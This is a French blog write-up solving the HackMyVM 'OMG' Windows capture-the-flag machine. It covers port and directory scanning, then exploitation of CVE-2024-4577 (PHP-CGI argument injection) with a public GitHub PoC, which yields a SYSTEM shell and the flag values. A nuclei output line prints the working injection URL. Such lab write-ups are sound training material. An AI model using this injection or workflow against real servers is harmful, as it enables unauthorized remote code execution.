---
title: "Solution du CTF OMG de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

OMG est un petit CTF basé Windows que j'ai trouvé sur [HackMyVM.eu](https://hackmyvm.eu/).

Tout repose sur l'exploitation d'une vulnérabilité connue. La faille n'est pas spécifique à Windows, mais a plus de chances d'apparaitre sur cet environnement (c'était sans doute plus facile pour l'auteur de reproduire la vulnérabilité avec Windows).

Je lance un ping scan pour retrouver la VM :

```console
$ sudo nmap -sP 192.168.242.1/24 -T5
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.131
Host is up (0.00041s latency).
MAC Address: 00:0C:29:E5:34:5F (VMware)
Nmap scan report for 192.168.242.254
Host is up (0.000089s latency).
MAC Address: 00:50:56:EA:F5:0F (VMware)
Nmap scan report for 192.168.242.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 9.70 seconds
```

J'ai ensuite lancé un scan des ports, mais ça prenait du temps alors j'ai fouillé ailleurs.


```console
$ smbclient -U "" -N -L //192.168.242.131
session setup failed: NT_STATUS_ACCESS_DENIED
```

Pas d'énumération possible de SMB. J'ai fouillé sur le port 80 :

```console
$ feroxbuster -u http://192.168.242.131/ -w raft-large-directories-lowercase.txt  -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.242.131/
 🚀  Threads               │ 50
 📖  Wordlist              │ raft-large-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       27w      300c http://192.168.242.131/img
403        9l       27w      264c http://192.168.242.131/webalizer
403        9l       27w      264c http://192.168.242.131/phpmyadmin
301        9l       27w      306c http://192.168.242.131/dashboard
301        9l       27w      302c http://192.168.242.131/xampp
403       11l       44w      383c http://192.168.242.131/licenses
403       11l       44w      383c http://192.168.242.131/server-status
302        0l        0w        0c http://192.168.242.131/
403        9l       27w      264c http://192.168.242.131/con
403        9l       27w      264c http://192.168.242.131/aux
403        9l       27w      264c http://192.168.242.131/error%1F_log
403        9l       27w      264c http://192.168.242.131/prn
403       11l       44w      383c http://192.168.242.131/server-info
[####################] - 23s    56150/56150   0s      found:13      errors:0      
[####################] - 22s    56150/56150   2462/s  http://192.168.242.131/
```

On trouve des noms de fichiers spécifiques à Windows (con, aux, prn).

Le dossier `dashboard` est une coquille vide, les champs de formulaires ne sont pas nommés.

Le dossier `xampp` est vide, mais sert d'indice pour trouver l'exploit à utiliser.

Finalement le scan de port s'est achevé :

```console
$ sudo nmap -sCV -p- -T5 192.168.242.131
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.131
Host is up (0.00024s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd
|_http-server-header: Apache
| http-title: Free Website Templates
|_Requested resource was http://192.168.242.131/dashboard/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd
|_http-server-header: Apache
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| http-title: Free Website Templates
|_Requested resource was https://192.168.242.131/dashboard/
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:E5:34:5F (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-12T21:33:58
|_  start_date: N/A
|_clock-skew: 9h59m58s
|_nbstat: NetBIOS name: WIN-H3GNRIMJQ65, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:e5:34:5f (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 397.22 seconds
```

Pas grand-chose à en tirer. On peut relancer Nmap cette fois avec les options `-O --osscan-guess` :

```
Running: Microsoft Windows 2022
OS CPE: cpe:/o:microsoft:windows_server_2022
OS details: Microsoft Windows Server 2022
```

Il existe bien quelques exploits pour ce système, mais ils nécessitent par exemple Exchange, SMB accessible ou IIS, etc.

La description du CTF sur HackMyVM mentionnait Orange Tsai, un blog par la team sécu de Orange.

Sur le blog, on trouve cet article :

[CVE-2024-4577 - Yet Another PHP RCE: Make PHP-CGI Argument Injection Great Again! | Orange Tsai](https://blog.orange.tw/posts/2024-06-cve-2024-4577-yet-another-php-rce/)

J'ai la flemme de démarrer la VM Kali Linux, sans compter qu'avec la VM Windows qui tourne la RAM va en prendre un coup.

J'ai trouvé cet exploit sur Github :

[GitHub - K3ysTr0K3R/CVE-2024-4577-EXPLOIT: A PoC exploit for CVE-2024-4577 - PHP CGI Argument Injection Remote Code Execution (RCE)](https://github.com/K3ysTr0K3R/CVE-2024-4577-EXPLOIT)

Il fonctionne en spécifiant la page d'index :

```console
$ python CVE-2024-4577.py -u http://192.168.242.131/

 ██████ ██    ██ ███████       ██████   ██████  ██████  ██   ██       ██   ██ ███████ ███████ ███████
██      ██    ██ ██                 ██ ██  ████      ██ ██   ██       ██   ██ ██           ██      ██
██      ██    ██ █████   █████  █████  ██ ██ ██  █████  ███████ █████ ███████ ███████     ██      ██ 
██       ██  ██  ██            ██      ████  ██ ██           ██            ██      ██    ██      ██  
 ██████   ████   ███████       ███████  ██████  ███████      ██            ██ ███████    ██      ██  

Coded By: K3ysTr0K3R

[*] Checking if the target is vulnerable
[+] The target http://192.168.242.131/ is vulnerable
[+] Initial command output: nt authority\system
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> dir c:\\users\\
Volume in drive C has no label.
 Volume Serial Number is DCC1-9F46

 Directory of c:\users

12/02/2025  08:38    <DIR>          .
12/02/2025  08:42    <DIR>          admin
11/12/2024  09:45    <DIR>          Administrator
11/12/2024  15:23    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  55?328?358?400 bytes free
Shell> dir c:\\users\\Administrator\\Desktop
Volume in drive C has no label.
 Volume Serial Number is DCC1-9F46

 Directory of c:\users\Administrator\Desktop

12/02/2025  09:25    <DIR>          .
11/12/2024  09:45    <DIR>          ..
12/02/2025  09:25                33 root.txt
12/02/2025  09:25                33 user.txt
               2 File(s)             66 bytes
               2 Dir(s)  55?328?358?400 bytes free
Shell> type c:\\users\\Administrator\\Desktop\\user.txt
4dcd00d9b6c66a0eae4a30aa0c781406
Shell> type c:\\users\\Administrator\\Desktop\\root.txt
af70e9322a562983e01a250ca84fe28d
```

Le serveur tournant avec les droits système (classique avec des kits tout faits comme XAMPP), on a déjà tout ce qu'il nous faut.

Sans l'indice, on aurait pu trouver la vulnérabilité avec Nuclei :

```console
$ nuclei -u http://192.168.242.131/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.0.3

                projectdiscovery.io

[INF] Your current nuclei-templates v9.5.2 are outdated. Latest is v10.2.0
[INF] Successfully updated nuclei-templates (v10.2.0). GoodLuck!
[WRN] Found 1 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.0.3 (outdated)
[INF] Current nuclei-templates version: v10.2.0 (latest)
[INF] New templates added in latest release: 268
[INF] Templates loaded for current scan: 9552
[INF] Executing 9520 signed templates from projectdiscovery/nuclei-templates
[WRN] Executing 55 unsigned templates. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1763 (Reduced 1662 Requests)
[INF] Using Interactsh Server: oast.live
[CVE-2024-4577] [http] [critical] http://192.168.242.131/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.242.131/dashboard/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.242.131/dashboard/
[http-trace:trace-request] [http] [info] http://192.168.242.131/
[HTTP-TRACE:trace-request] [http] [info] http://192.168.242.131/
[waf-detect:apachegeneric] [http] [info] http://192.168.242.131/
[INF] Skipped 192.168.242.131:80 from target list as found unresponsive 30 times
```
